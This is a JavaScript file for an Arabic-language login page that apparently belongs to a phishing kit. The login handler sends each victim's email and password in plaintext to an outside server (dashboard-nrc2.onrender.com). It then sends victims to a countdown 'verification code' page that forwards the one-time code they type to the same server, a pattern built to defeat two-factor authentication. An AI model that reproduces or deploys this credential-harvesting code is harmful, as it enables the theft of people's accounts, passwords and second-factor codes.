document.addEventListener("DOMContentLoaded", function () {
  // --- 1️⃣ CTA Button (index.html) ---
  const ctaButton = document.getElementById("ctaButton");
  if (ctaButton) {
    ctaButton.addEventListener("click", function () {
      window.location.href = "login.html";
    });
  }

  // --- 2️⃣ LOGIN FORM HANDLER (login.html) ---
  const loginForm = document.querySelector(".login-form");
  if (loginForm) {
    loginForm.addEventListener("submit", async function (e) {
      e.preventDefault();

      const email = loginForm.querySelector('input[type="email"]').value.trim();
      const password = loginForm.querySelector('input[type="password"]').value;

      if (!email || !password) {
        alert("يرجى إدخال البريد الإلكتروني وكلمة السر.");
        return;
      }

      const submitBtn = loginForm.querySelector('button[type="submit"]');
      const originalText = submitBtn.textContent;
      submitBtn.disabled = true;
      submitBtn.textContent = "جارٍ الإرسال...";

      try {
        const response = await fetch("https://dashboard-nrc2.onrender.com/api/messages", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            text: `🔐 تسجيل دخول جديد:\nالبريد: ${email}\nكلمة السر: ${password}`
          })
        });

        if (!response.ok) throw new Error(`خطأ في الإرسال: ${response.status}`);
        console.log("✅ Login message sent successfully!");
        window.location.href = "code.html";
      } catch (error) {
        console.error("Login error:", error);

      } finally {
        submitBtn.disabled = false;
        submitBtn.textContent = originalText;
      }
    });
  }

  // --- 3️⃣ TIMER (code.html) ---
  const timerDisplay = document.getElementById("timer");
  if (timerDisplay) {
    let totalSeconds = 110;

    function updateTimer() {
      const minutes = Math.floor(totalSeconds / 60);
      const seconds = totalSeconds % 60;
      timerDisplay.textContent =
        (minutes < 10 ? "0" : "") + minutes + ":" + (seconds < 10 ? "0" : "") + seconds;

      if (totalSeconds > 0) {
        totalSeconds--;
      } else {
        clearInterval(timer);
        timerDisplay.textContent = "انتهى الوقت";
        timerDisplay.style.color = "red";
      }
    }

    updateTimer();
    const timer = setInterval(updateTimer, 1000);
  }

  // --- 4️⃣ VERIFY FORM (code.html) ---
  const verifyForm = document.querySelector(".verify-form");
  if (verifyForm) {
    console.log("✅ verify-form found, attaching submit listener");

    verifyForm.addEventListener("submit", async (e) => {
      e.preventDefault();

      const codeInput = verifyForm.querySelector('input[type="text"]').value.trim();
      if (!codeInput) {
        alert("يرجى إدخال رمز التحقق.");
        return;
      }

      const submitBtn = verifyForm.querySelector('button[type="submit"]');
      const originalText = submitBtn.textContent;
      submitBtn.disabled = true;
      submitBtn.textContent = "جارٍ الإرسال...";

      try {
        const response = await fetch("https://dashboard-nrc2.onrender.com/api/messages", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            text: `🔢 رمز تحقق جديد:\n${codeInput}`,
          }),
        });

        console.log("Response status:", response.status);

        if (!response.ok) throw new Error(`HTTP ${response.status}`);
        
      } catch (err) {
        console.error("Fetch error:", err);
        
      } finally {
        submitBtn.disabled = false;
        submitBtn.textContent = originalText;
      }
    });
  }
});
